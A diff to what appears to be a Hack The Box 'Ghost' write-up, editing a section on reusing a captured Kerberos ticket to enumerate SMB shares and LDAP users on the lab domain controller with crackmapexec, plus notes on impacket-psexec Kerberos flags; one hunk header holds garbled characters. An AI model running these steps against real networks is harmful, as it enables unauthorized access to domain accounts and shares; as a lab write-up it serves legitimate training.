@@ -1032,22 +1032,33 @@ dï¿½?HS?ï¿½ï¿½ï¿½K+ï¿½aï¿½csï¿½ï¿½ï¿½Nï¿½8:0nsm>q]gï¿½ï¿½u6ï¿½ï¿½ï¿½Yï¿½ï¿½ï¿½%ï
 
 Testing ticket:
 
+> [!Tip]
+>
+> Install `klist` and `kinit` commands by installing the `krb5-user` package
+
 ```console
 root@kali:~# export KRB5CCNAME=/tmp/krb5cc_50
 
-root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache
+root@kali:~# klist
+Ticket cache: FILE:/tmp/krb5cc_50
+Default principal: florence.ramirez@GHOST.HTB
+
+Valid starting     Expires            Service principal
+08/22/24 07:56:01  08/22/24 17:56:01  krbtgt/GHOST.HTB@GHOST.HTB
+        renew until 08/23/24 07:56:01
+
+root@kali:~# crackmapexec smb ghost.htb --use-kcache --shares
 SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
 SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
-
-root@kali:~# crackmapexec smb DC01.ghost.htb --use-kcache --users
-SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
-SMB         ghost.htb       445    DC01             [+] ghost.htb\ from ccache
-SMB         ghost.htb       445    DC01             [-] Error enumerating domain users using dc ip ghost.htb: NTLM needs domain\username and a password
-SMB         ghost.htb       445    DC01             [*] Trying with SAMRPC protocol
-
-root@kali:~# crackmapexec ldap DC01.ghost.htb --use-kcache
-SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
-LDAP        ghost.htb       389    DC01             [+] ghost.htb\florence.ramirez from ccache
+SMB         ghost.htb       445    DC01             [+] Enumerated shares
+SMB         ghost.htb       445    DC01             Share           Permissions     Remark
+SMB         ghost.htb       445    DC01             -----           -----------     ------
+SMB         ghost.htb       445    DC01             ADMIN$                          Remote Admin
+SMB         ghost.htb       445    DC01             C$                              Default share
+SMB         ghost.htb       445    DC01             IPC$            READ            Remote IPC
+SMB         ghost.htb       445    DC01             NETLOGON        READ            Logon server share
+SMB         ghost.htb       445    DC01             SYSVOL          READ            Logon server share
+SMB         ghost.htb       445    DC01             Users           READ
 
 root@kali:~# crackmapexec ldap DC01.ghost.htb --use-kcache --users
 SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
@@ -1082,7 +1093,7 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 > [!Note]
 >
 > Specifying to use kerberos cache for:
-> - `crackmapexec smb`: `--use-kcache` - Use Kerberos authentication from ccache file (`KRB5CCNAME`) (different from `-k` / `--kerberos`)
+> - `crackmapexec`: `--use-kcache` - Use Kerberos authentication from ccache file (`KRB5CCNAME`) (different from `-k` / `--kerberos`)
 > - `impacket-psexec`:
 >   - `-no-pass` - don't ask for password (useful for `-k`)
 >   - `-k` - Use Kerberos authentication. Grabs credentials from ccache file (`KRB5CCNAME`) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
